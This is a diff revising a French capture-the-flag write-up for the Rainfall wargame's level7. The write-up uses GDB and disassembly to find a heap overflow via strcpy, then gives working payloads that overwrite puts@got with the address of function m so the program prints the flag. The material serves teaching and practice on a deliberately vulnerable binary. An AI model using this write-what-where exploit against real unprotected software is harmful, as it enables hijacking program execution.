@@ -1,3 +1,8 @@
+Parfait, voici **un rapport “équilibré”**, dans l’esprit des **rapports précédents Rainfall** :
+
+* **ASM + commandes GDB** pour montrer comment les infos sont trouvées
+* **équivalent C lisible** pour comprendre la logique
+* **explications continues**, sans rupture, sans “tu”, prêt à être rendu
 
 ---
 
@@ -5,161 +10,150 @@
 
 ## Objectif
 
-Analyser le binaire `level7` afin d’exploiter une vulnérabilité mémoire permettant de détourner le flot d’exécution et d’afficher le contenu du fichier contenant le flag du niveau suivant.
+Analyser le binaire `level7` afin d’exploiter une vulnérabilité sur le tas permettant de détourner l’exécution du programme et d’afficher le contenu du fichier contenant le flag du niveau suivant.
 
 ---
 
-## Reconnaissance
+## Reconnaissance initiale
 
-Listing des fonctions disponibles (symboles) :
+La liste des fonctions présentes dans le binaire permet d’identifier rapidement les points d’intérêt :
 
 ```bash
 (gdb) info functions
 ```
 
-Les fonctions intéressantes observées :
+Fonctions notables :
 
 * `malloc`, `strcpy`, `fopen`, `fgets`, `puts`
-* une fonction interne `m` (non appelée directement dans `main`)
+* une fonction interne `m`, non appelée explicitement dans `main`
 
-Pour visualiser les appels et la logique de `main` :
+La présence de `strcpy` combinée à des allocations dynamiques de petite taille suggère une vulnérabilité de type heap overflow.
+
+---
+
+## Analyse de la fonction `main` (assembleur)
 
 ```bash
 (gdb) disas main
 ```
 
-Et pour inspecter la fonction interne :
+Les premières instructions montrent quatre allocations successives :
 
-```bash
-(gdb) disas m
+```asm
+movl $0x8,(%esp)
+call malloc
+```
+
+répétées quatre fois. Chaque `malloc(8)` retourne une adresse stockée soit sur la stack, soit dans une structure précédemment allouée.
+
+Les instructions suivantes sont caractéristiques :
+
+```asm
+movl $0x1,(%eax)
+mov %edx,0x4(%eax)
+```
+
+Cela indique que chaque bloc de 8 octets est utilisé comme une structure contenant :
+
+* un entier sur les 4 premiers octets
+* un pointeur sur les 4 suivants
+
+---
+
+## Interprétation en C (structure logique)
+
+```c
+typedef struct s_node {
+    int   id;
+    char *buf;
+} t_node;
+```
+
+Organisation mémoire sur le tas :
+
+```
+malloc1 : [ id=1 ][ ptr -> malloc2 ]
+malloc2 : [ buffer (8 octets) ]
+
+malloc3 : [ id=2 ][ ptr -> malloc4 ]
+malloc4 : [ buffer (8 octets) ]
 ```
 
 ---
 
-## Analyse de `main`
+## Point critique : copies non protégées
 
-`main` effectue :
+Dans `main`, deux appels à `strcpy` sont effectués :
 
-1. 4 appels à `malloc(8)`
-2. initialise 2 structures logiques
-3. copie `argv[1]` et `argv[2]` avec `strcpy`
-4. ouvre un fichier, lit dans un buffer global, puis affiche via `puts`
-
-Les 4 allocations se voient directement dans le désassemblage :
-
-```bash
-(gdb) disas main
-# ... movl $0x8,(%esp)
-# ... call malloc@plt
-# ... (4 fois)
+```asm
+call strcpy@plt   ; argv[1] -> malloc2
+call strcpy@plt   ; argv[2] -> malloc4 (via pointeur)
 ```
 
-### Structure implicite
+Équivalent C :
 
-Les instructions suivantes indiquent clairement une structure `{ int ; ptr }` :
+```c
+strcpy(n1->buf, argv[1]);
+strcpy(n2->buf, argv[2]);
+```
 
-* `movl $0x1,(%eax)` : écriture d’un int au début du bloc
-* `mov %edx,0x4(%eax)` : écriture d’un pointeur à l’offset `+4`
-
-Ce motif apparaît deux fois, ce qui correspond à deux nœuds.
+Les buffers font **8 octets**, mais `strcpy` ne vérifie pas la taille : un débordement sur le tas est possible.
 
 ---
 
-## Vulnérabilité
+## Analyse dynamique du tas avec GDB
 
-Les deux copies utilisateurs se voient dans le désassemblage :
-
-```bash
-(gdb) disas main
-# ...
-# call strcpy@plt      ; strcpy(malloc1->buf, argv[1])
-# ...
-# call strcpy@plt      ; strcpy(malloc3->buf, argv[2])
-```
-
-`strcpy` ne fait aucun contrôle de taille : si `argv[1]` dépasse la taille du buffer (8 octets), un débordement sur le tas est possible et peut corrompre les champs de la structure suivante.
-
----
-
-## Analyse dynamique : adresses heap et offset
-
-Pour récupérer les adresses exactes des allocations, des breakpoints sont posés juste après les retours de `malloc` afin de lire `%eax` (valeur de retour) :
+Des breakpoints sont placés juste après certains `malloc` pour observer les adresses retournées dans `%eax` :
 
 ```bash
-(gdb) break *0x08048550   # juste après le 2e malloc
-(gdb) break *0x08048565   # juste après le 3e malloc
+(gdb) break *0x08048550
+(gdb) break *0x08048565
 (gdb) run AAA BBB
 (gdb) info registers
 ```
 
-Exemple d’observation (adresses typiques) :
-
-* `malloc2 = 0x0804a018`
-* `malloc3 = 0x0804a028`
-
-Pour vérifier directement les valeurs mémoire pointées par les structures :
-
-```bash
-(gdb) x/wx 0x0804a008     # id de malloc1
-(gdb) x/wx 0x0804a00c     # ptr malloc1->buf (malloc2)
-(gdb) x/wx 0x0804a028     # id de malloc3
-(gdb) x/wx 0x0804a02c     # ptr malloc3->buf (malloc4)
-```
-
-### Calcul de l’offset pour écraser `malloc3->buf`
-
-Distance entre `malloc2` et `malloc3` :
+Adresses observées :
 
 ```
-0x0804a028 - 0x0804a018 = 0x10 = 16 octets
+malloc2 = 0x0804a018
+malloc3 = 0x0804a028
 ```
 
-Pour atteindre le champ pointeur (`+4`) dans `malloc3` :
+La différence est de :
 
-* 16 octets (jusqu’à `malloc3`)
-* +4 octets (saut du champ `id`)
+```
+0x0804a028 - 0x0804a018 = 0x10 (16 octets)
+```
 
-Total : **20 octets**
+Pour atteindre le champ `buf` de `malloc3` depuis `malloc2` :
+
+* 16 octets pour atteindre la structure suivante
+* +4 octets pour dépasser le champ `id`
+
+Soit **20 octets** avant d’écraser le pointeur cible.
 
 ---
 
-## Choix de la cible : `puts@got`
+## Vulnérabilité exploitée : write-what-where
 
-Pour identifier la GOT de `puts`, il suffit d’inspecter `puts@plt` :
+Le premier `strcpy` permet d’écraser `malloc3->buf`.
 
-```bash
-(gdb) disas puts
+Le second `strcpy` devient alors :
+
+```c
+strcpy(corrupted_pointer, argv[2]);
 ```
 
-On observe le saut indirect :
+Ce mécanisme constitue une primitive **write-what-where** :
 
-```asm
-jmp *0x8049928
-```
-
-Ce qui donne :
-
-* `puts@got = 0x08049928`
-
-L’adresse de la fonction `m` se récupère via :
-
-```bash
-(gdb) info address m
-# ou
-(gdb) disas m
-```
-
-Ici :
-
-* `m = 0x080484f4`
+* **where** : contrôlé via `argv[1]`
+* **what** : contenu de `argv[2]`
 
 ---
 
-## Logique d’exploitation (write-what-where)
+## Choix de la cible : GOT de `puts`
 
-### Contrainte : laisser `fopen` et `fgets` s’exécuter
-
-Le désassemblage de `main` montre :
+La fin de `main` est la suivante :
 
 ```asm
 call fopen
@@ -167,43 +161,72 @@ call fgets
 call puts
 ```
 
-`fgets` lit le flag dans un buffer global (`0x8049960`, visible dans les arguments de `fgets`) :
+* `fopen` ouvre le fichier
+* `fgets` lit le flag dans un buffer global (`0x8049960`)
+* `puts` est appelé ensuite
+
+Le buffer global utilisé par `fgets` est visible dans les arguments :
 
 ```bash
 (gdb) disas main
-# ... movl $0x8049960,(%esp)
-# ... call fgets@plt
+# movl $0x8049960,(%esp)
+# call fgets@plt
 ```
 
-`m` affiche ensuite ce buffer global :
+La fonction `m` affiche ce même buffer :
 
 ```bash
 (gdb) disas m
-# ... movl $0x8049960,0x4(%esp)
-# ... call printf@plt
+# printf(fmt, 0x8049960, time())
 ```
 
-Donc :
+Il est donc nécessaire de **laisser s’exécuter `fopen` et `fgets`**, puis de détourner l’exécution **au moment de `puts`**.
 
-* détourner `fgets` casserait la lecture du flag
-* détourner `puts` est idéal car il arrive **après** `fgets`
+L’entrée GOT de `puts` est identifiée via :
+
+```bash
+(gdb) disas puts
+```
+
+```asm
+jmp *0x8049928
+```
+
+Adresse retenue :
+
+```
+puts@got = 0x08049928
+```
+
+Adresse de la fonction `m` :
+
+```bash
+(gdb) info address m
+```
+
+```
+m = 0x080484f4
+```
 
 ---
 
 ## Exploitation
 
-### Étape 1 : forcer `malloc3->buf = puts@got`
+### 1. Écrasement de `malloc3->buf`
 
 Payload `argv[1]` :
-
-* 20 octets de padding
-* puis l’adresse `puts@got` en little-endian
 
 ```bash
 python -c 'print("A"*20 + "\x28\x99\x04\x08")'
 ```
 
-### Étape 2 : écrire l’adresse de `m` dans `puts@got`
+Ce payload force :
+
+```
+malloc3->buf = puts@got
+```
+
+### 2. Écriture de l’adresse de `m` dans la GOT
 
 Payload `argv[2]` :
 
@@ -211,22 +234,30 @@ Payload `argv[2]` :
 python -c 'print("\xf4\x84\x04\x08")'
 ```
 
-### Exécution
+Le second `strcpy` effectue alors :
+
+```
+*(puts@got) = &m
+```
+
+### Exécution finale
 
 ```bash
 ./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
 ```
 
-Effet :
-
-* le second `strcpy` écrit dans `puts@got`
-* l’appel final `puts("~~")` saute désormais vers `m`
-* `m` affiche le flag stocké dans le buffer global
+L’appel final à `puts("~~")` est redirigé vers `m`, qui affiche le contenu du buffer global : le flag.
 
 ---
 
 ## Conclusion
 
-Le niveau 7 exploite un **heap overflow** sur un buffer de 8 octets utilisé avec `strcpy`, permettant la corruption d’un pointeur dans une structure adjacente. Cela crée un **write-what-where** : le second `strcpy` est transformé en primitive d’écriture arbitraire, utilisée pour écraser `puts@got` avec l’adresse de la fonction `m`, afin d’obtenir l’exécution de `m` après que `fgets` ait chargé le flag en mémoire.
+Le niveau 7 repose sur un **heap overflow** permettant la corruption d’un pointeur dans une structure adjacente. Cette corruption transforme un second `strcpy` en primitive **write-what-where**, exploitée pour écraser l’entrée GOT de `puts` et rediriger l’exécution vers une fonction interne `m`, appelée après la lecture du flag en mémoire.
+
+Ce niveau illustre :
+
+* l’impact des copies non bornées sur le tas
+* l’importance de l’ordre des appels
+* le rôle central de la GOT dans le détournement de flot sur ELF non protégés
 
 ---
